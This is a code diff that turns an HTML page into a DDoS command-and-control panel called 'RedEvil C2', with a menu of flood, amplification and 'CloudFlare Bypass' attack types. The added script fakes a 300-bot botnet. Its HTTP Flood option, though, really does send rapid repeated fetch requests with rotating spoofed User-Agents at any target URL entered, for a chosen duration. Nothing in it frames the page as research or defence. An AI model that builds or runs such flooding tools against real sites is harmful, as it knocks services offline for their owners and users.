@@ -3,31 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Botnet Control Panel</title>
-    <link rel="stylesheet" href="d.css">
+    <title>RedEvil C2</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #ff0000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        #controls {
+            background-color: #333;
+            padding: 20px;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            text-align: center;
+        }
+        #status {
+            margin-top: 20px;
+            color: #ff0000;
+        }
+        input, select, button {
+            margin: 5px 0;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #ff0000;
+            color: #000;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Botnet Control Panel</h1>
-        <div class="botnet-info">
-            <h2>Botnet Information</h2>
-            <p>Number of Bots: <span id="bot-count">0</span></p>
-            <p>Status: <span id="bot-status">Offline</span></p>
-        </div>
-        <div class="attack-options">
-            <h2>Attack Options</h2>
-            <label for="target-url">Target URL:</label>
-            <input type="text" id="target-url" placeholder="Enter target URL">
-            <label for="attack-type">Attack Type:</label>
-            <select id="attack-type">
-                <option value="SYN">SYN Flood</option>
-                <option value="UDP">UDP Flood</option>
-                <option value="TCP">TCP Flood</option>
-                <option value="ICMP">ICMP Flood</option>
-            </select>
-            <button onclick="startAttack()">Start Attack</button>
-        </div>
+    <div id="controls">
+        <h1>RedEvil C2</h1>
+        <label for="target-url">Target URL:</label>
+        <input type="text" id="target-url" placeholder="https://example.com">
+        <br>
+        <label for="attack-type">Attack Type:</label>
+        <select id="attack-type">
+            <option value="HTTP Flood">HTTP Flood</option>
+            <option value="UDP Flood">UDP Flood</option>
+            <option value="SYN Flood">SYN Flood</option>
+            <option value="ICMP Flood">ICMP Flood</option>
+            <option value="DNS Amplification">DNS Amplification</option>
+            <option value="NTP Amplification">NTP Amplification</option>
+            <option value="SSDP Amplification">SSDP Amplification</option>
+            <option value="Memcached Amplification">Memcached Amplification</option>
+            <option value="Chargen Amplification">Chargen Amplification</option>
+            <option value="SNMP Amplification">SNMP Amplification</option>
+            <option value="RDP Flood">RDP Flood</option>
+            <option value="SIP Flood">SIP Flood</option>
+            <option value="CloudFlare Bypass">CloudFlare Bypass</option>
+        </select>
+        <br>
+        <label for="attack-duration">Attack Duration (seconds):</label>
+        <input type="number" id="attack-duration" value="60">
+        <br>
+        <button onclick="startAttack()">Start Attack</button>
     </div>
-    <script src="d.js"></script>
+    <div id="status">
+        <p>Bot Count: 300</p>
+        <p>Bot Status: <span id="bot-status"></span></p>
+        <p>Attack Status: <span id="attack-status"></span></p>
+    </div>
+
+    <script>
+        let bots = [];
+        const botCount = 300;
+        let botStatus = "Offline";
+        let attackStatus = "Idle";
+
+        function updateBotnetStatus() {
+            document.getElementById('bot-status').innerText = botStatus;
+            document.getElementById('attack-status').innerText = attackStatus;
+        }
+
+        function startAttack() {
+            const targetUrl = document.getElementById('target-url').value;
+            const attackType = document.getElementById('attack-type').value;
+            const attackDuration = parseInt(document.getElementById('attack-duration').value);
+
+            if (!targetUrl) {
+                alert('Please enter a target URL.');
+                return;
+            }
+
+            botStatus = "Online";
+            attackStatus = `Attacking ${targetUrl} with ${botCount} bots using ${attackType}`;
+            updateBotnetStatus();
+
+            console.log(`Starting ${attackType} attack on ${targetUrl} with ${botCount} bots.`);
+            alert(`Starting ${attackType} attack on ${targetUrl} with ${botCount} bots.`);
+            simulateAttack(targetUrl, attackType, botCount, attackDuration);
+        }
+
+        function simulateAttack(targetUrl, attackType, numBots, duration) {
+            const endTime = Date.now() + duration * 1000;
+            const userAgents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+            ];
+
+            function sendRequest() {
+                if (Date.now() >= endTime) {
+                    return;
+                }
+
+                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+                const headers = new Headers();
+                headers.append('User-Agent', userAgent);
+
+                if (attackType === 'HTTP Flood') {
+                    fetch(targetUrl, { headers })
+                        .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
+                        .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
+                } else {
+                    console.log(`Sending ${attackType} to ${targetUrl}`);
+                }
+
+                setTimeout(sendRequest, 1000 / (numBots * 500)); // Adjust intensity based on bot count
+            }
+
+            for (let i = 0; i < numBots; i++) {
+                setTimeout(sendRequest, i * 100);
+            }
+        }
+
+        function initializeBotnet() {
+            bots = [];
+            for (let i = 0; i < botCount; i++) {
+                bots.push(`Bot ${i + 1}`);
+            }
+            botStatus = "Online";
+            updateBotnetStatus();
+        }
+
+        window.onload = initializeBotnet;
+    </script>
 </body>
 </html>
